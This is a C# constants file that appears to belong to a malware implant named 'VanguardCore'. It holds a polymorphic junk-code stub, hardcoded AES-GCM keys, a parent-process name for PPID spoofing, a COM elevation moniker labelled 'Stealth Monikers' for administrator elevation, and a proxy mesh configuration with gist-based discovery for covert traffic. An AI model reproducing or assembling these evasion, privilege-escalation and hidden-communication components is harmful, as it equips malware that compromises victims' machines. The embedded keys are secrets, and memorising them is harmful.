using System;

namespace VanguardCore
{
    public static class Constants
    {
        // [POLY_JUNK]
        private static void _vanguard_d77cf33d() {
            int val = 72351;
            if (val > 50000) Console.WriteLine("Hash:" + 72351);
        }

        // These keys are updated at build time by full_rebuild.ps1
        // AES-GCM Keys (Base64)
        public const string MASTER_KEY_B64 = "6giYUdThgyRzQ+Im7+hwlVIpqEXI9V9qGvH/0+0CP3I=";
        public const string ENCRYPTED_SESSION_KEY_B64 = "bNQ5vxlPQOD1N7ogVgRUTWDq5AbNEwocqLtDTzPdIfg=";
        
        // Target process name for PPID spoofing
        public const string SPOOF_PARENT = "explorer";
        
        // Stealth Monikers
        public const string MONIKER_PREFIX = "Elevation:Administrator!new:";

        // --- ANTI-GFW PROXY MESH CONFIG ---
        // L1: Primary VPS Proxy (Base64 XORed recommended in real build)
        public const string L1_PROXY_HOST = ""; // e.g. "45.123.45.67"
        public const int L1_PROXY_PORT = 1080;
        public const string L1_PROXY_USER = "";
        public const string L1_PROXY_PASS = "";

        // L2: Secondary Static Proxy
        public const string L2_PROXY_HOST = "";
        public const int L2_PROXY_PORT = 1080;

        // Gist Mesh Discovery
        public const string GIST_MESH_FILENAME = "proxies.json";
        public static readonly string[] CLEAN_REGIONS = { "HK", "SG", "TW", "US", "DE", "FR", "JP", "GB" };
    }
}



























































































